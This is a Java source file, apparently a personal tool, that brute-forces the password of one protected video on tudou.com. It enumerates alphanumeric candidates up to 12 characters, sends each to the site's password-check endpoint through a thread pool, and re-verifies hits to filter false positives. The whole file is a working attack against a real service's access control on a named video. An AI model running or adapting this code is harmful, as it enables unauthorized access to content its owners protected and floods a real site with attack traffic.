package com.camels.crack;

import com.camels.crack.utils.CommonHttpConnection;
import com.camels.crack.utils.HttpConnectionParameters;

import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Created by zhanggc on 2014/5/27.
 */
public class Crack {
    public static String[] params = {"0", "1", "2", "3", "4", "5", "6", "7", "8", "9"
            ,"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"
            ,"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"};
    public static Map<Integer, String> paramMap = new HashMap<Integer, String>(params.length - 1);
    public static int bit;
    public static final String url = "http://www.tudou.com/tvp/psword.action?ic=4jJ_2dBLp9M&pw=";//bmnM33Gl9Dw
    public static final List<String> result = new ArrayList<String>();
    public static final Map<String, String> requestProperty = new HashMap<String, String>();
    public static ExecutorService executor = Executors.newFixedThreadPool(4);
    public static int validator = 10;
    public static Map<Integer,String> trash = new HashMap<Integer, String>();


    static {
        bit = 12;
        for (int i = 0; i < params.length; i++) {
            paramMap.put(i, params[i]);
        }
        requestProperty.put("Content-Type", "text/html;charset=UTF-8");
    }

    public static void main(String[] args) {
        long start = System.currentTimeMillis();
        crack();
        System.out.println(System.currentTimeMillis()-start);
    }

    public static String crack() {
        String pwd = "";
        double loop = Math.pow(params.length, bit);
        List<Integer> paramList = new ArrayList<Integer>();
        paramList.add(0);
        paramList.add(7);
        paramList.add(51);
        paramList.add(8);
        for (int i = 0; i < loop; i++) {
            if(i%100==0){
                try{
                    Thread.sleep(1000);
                }catch (InterruptedException ex){
                    ex.printStackTrace();
                }
            }
            detect(i, paramList);
            if (request(paramList)) {
                return pwd;
            }
        }
        return pwd;
    }

    public static void detect(int count, List<Integer> paramList) {
        int index = count % (params.length);
        if (count != 0 && index == 0) {
            for (int i = 1; i < bit; i++) {
                switch (count(i, paramList)) {
                    case -1: {
                        paramList.set(i, paramList.get(i) + 1);
                        paramList.set(0, index);
                        return;
                    }
                    case 0: {
                        paramList.set(0, index);
                        return;
                    }
                    case 1: {
                        break;
                    }
                }
            }
        }
        paramList.set(0, index);
    }

    /**
     * @param bit
     * @param paramList
     * @return 0<strong>新增一位</strong> 1<strong>进位</strong> -1<strong>原位</strong>
     */
    public static int count(int bit, List<Integer> paramList) {
        if (paramList.size() < bit + 1) {
            if (bit > 1) {
                paramList.set(bit - 1, 0);//前一位归零
            }
            paramList.add(0);
            return 0;
        }
        if (paramList.get(bit) < params.length - 1)
            return -1;
        else {
            paramList.set(bit, 0);//当前位归零
            return 1;
        }
    }

    public static boolean request(List<Integer> paramList) {
        executor.execute(new Task(concat(paramList)));
        if (result.size() > 0) {
            executor.shutdownNow();
            printTrash();
            System.out.println("密码: " + result.get(0));
            return true;
        }
        return false;
    }

    public static String concat(List<Integer> paramList) {
        StringBuffer paramString = new StringBuffer();
        for (int index : paramList) {
            paramString.append(paramMap.get(index));
        }
        return paramString.toString();
    }

    static class Task implements Runnable{
        private String param = "";
        public Task(){}
        public Task(String param){
            this.param = param;
        }
        @Override
        public void run() {
            System.out.println("------------"+param);
            if ("true".equals(post(param))) {
                if(validate(param))
                    result.add(param);
            }
        }
    };

    /**
     * 破解校正
     * @param param
     * @return
     */
    public static boolean validate (String param){
        int count = 0;
        for(int i=0;i<validator;i++){
            if ("true".equals(post(param))) {
                count++;
            }
        }
        trash.put(count,param);
        if(count>(validator/2)){
            return true;
        }else{
            return false;
        }
    }

    /**
     * 发送请求
     * @param param
     * @return
     */
    public static String post(String param){
        boolean check = true;
        String response = "";
        while(check){
            check = false;
            try {
                response = CommonHttpConnection.proccess(new HttpConnectionParameters(url + param, requestProperty), new HashMap());
            } catch (IOException ex) {
                ex.printStackTrace();
                check = true;
            }
        }
        return response;
    }

    public static void printTrash(){
        StringBuffer msg = new StringBuffer("trash count-pwd: ");
        for(int count:trash.keySet()){
            msg.append(count)
                    .append("-")
                    .append(trash.get(count))
                    .append(" | ");
        }
        System.out.println(msg);
    }
}
